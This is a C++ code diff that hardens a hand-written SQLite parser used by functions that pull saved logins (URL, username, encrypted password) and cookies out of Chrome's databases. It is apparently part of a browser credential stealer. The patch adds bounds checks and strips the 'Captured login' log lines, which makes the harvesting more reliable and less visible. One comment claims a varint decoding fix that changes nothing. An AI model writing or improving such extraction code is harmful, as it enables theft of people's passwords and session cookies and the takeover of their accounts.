@@ -4,6 +4,7 @@
 #include <cstring>
 #include <fstream>
 #include <tuple>
+#include <climits>
 #include "logger/file_logger.h"
 
 #define SQLITE_HEADER_SIZE 100
@@ -85,9 +86,14 @@ private:
         uint32_t offset = (pageNum - 1) * page_size;
         if (offset >= database.size()) return;
 
+        // Additional safety check for page header access
+        if (offset + 8 >= database.size()) return;
+
         uint8_t pageType = database[offset];
 
         if (pageType == SQLITE_BTREE_LEAF_TABLE) {
+            // Safe access to cell count with bounds checking
+            if (offset + 4 >= database.size()) return;
             uint16_t numCells = (database[offset + 3] << 8) | database[offset + 4];
             std::vector<uint16_t> cellPointers;
             for (uint16_t i = 0; i < numCells; i++) {
@@ -201,14 +207,36 @@ private:
     int ReadVarint(uint32_t offset, uint64_t& value) {
         value = 0;
         int bytes = 0;
-        for (int i = 0; i < 9; i++) {
-            if (offset + i >= database.size()) break;
-            uint8_t byte = database[offset + i];
-            if (i < 8) value |= (uint64_t)(byte & 0x7F) << (7 * i);
-            else value |= (uint64_t)byte << 56;
-            bytes++;
-            if ((byte & 0x80) == 0) break;
+        
+        // Safety check for initial offset
+        if (offset >= database.size()) {
+            return 0;
         }
+        
+        for (int i = 0; i < 9; i++) {
+            // Check for potential overflow in offset calculation
+            if (offset > UINT_MAX - i || offset + i >= database.size()) {
+                break;
+            }
+            
+            uint8_t byte = database[offset + i];
+            
+            // Fix varint decoding logic - use proper bit shifting
+            if (i < 8) {
+                value |= (uint64_t)(byte & 0x7F) << (7 * i);
+            } else {
+                // Last byte uses all 8 bits
+                value |= (uint64_t)byte << 56;
+            }
+            
+            bytes++;
+            
+            // If high bit is not set, this is the last byte
+            if ((byte & 0x80) == 0) {
+                break;
+            }
+        }
+        
         return bytes;
     }
 };
@@ -250,7 +278,7 @@ ExtractChromePasswordsMinimal(const std::wstring& loginDataPath) {
             std::string url(row[0].begin(), row[0].end());
             std::string username(row[1].begin(), row[1].end());
             std::vector<uint8_t> encryptedPassword = row[2];
-            LogInfo(("[SQLite] Captured login for: " + url).c_str());
+            // NOTE: Do not log sensitive URL/login data for security
             results.emplace_back(url, username, encryptedPassword);
         }
     }
@@ -283,7 +311,7 @@ ExtractChromeCookiesMinimal(const std::wstring& cookieDbPath) {
             std::string host(row[0].begin(), row[0].end());
             std::string name(row[1].begin(), row[1].end());
             std::string value(row[2].begin(), row[2].end());
-            LogInfo(("[SQLite] Cookie for host: " + host + " name: " + name).c_str());
+            // NOTE: Do not log sensitive cookie data for security
             cookies.emplace_back(host, name, value);
         }
     }
